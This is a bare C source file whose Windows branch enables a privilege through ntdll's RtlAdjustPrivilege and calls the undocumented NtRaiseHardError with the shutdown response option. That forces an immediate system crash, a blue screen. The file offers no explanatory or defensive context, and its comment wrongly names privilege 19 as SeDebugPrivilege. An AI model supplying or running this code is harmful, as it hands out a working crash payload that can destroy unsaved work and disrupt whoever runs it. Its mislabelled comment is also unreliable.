#ifdef _WIN32
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(
    IN NTSTATUS ErrorStatus,
    IN ULONG NumberOfParameters,
    IN ULONG UnicodeStringParameterMask,
    IN PULONG_PTR Parameters,
    IN ULONG ValidResponseOptions,
    OUT PULONG Response
);

typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

int main() {
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (ntdll) {
        RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            BOOLEAN enabled;
            RtlAdjustPrivilege(19, TRUE, FALSE, &enabled); // SeDebugPrivilege
            ULONG response;
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
        }
        FreeLibrary(ntdll);
    }
    return 0;
}
#else

int main() {
    return 0;
}
#endif